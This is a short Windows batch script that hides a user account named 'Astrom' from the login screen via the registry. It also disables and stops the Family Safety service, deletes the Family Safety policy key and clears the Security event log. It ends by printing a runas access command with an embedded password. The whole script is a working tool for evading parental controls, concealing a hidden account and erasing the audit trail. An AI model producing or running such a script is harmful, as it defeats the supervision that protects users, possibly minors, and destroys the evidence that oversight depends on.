@echo off
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v Astrom /t REG_DWORD /d 0 /f
sc config FamilySafetyService start= disabled ^& net stop FamilySafetyService /y
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\FamilySafety" /f
wevtutil cl Security
echo Astrom HIDDEN forever! Access: Win+R runas /user:Astrom brave.exe ^<hack2024
pause

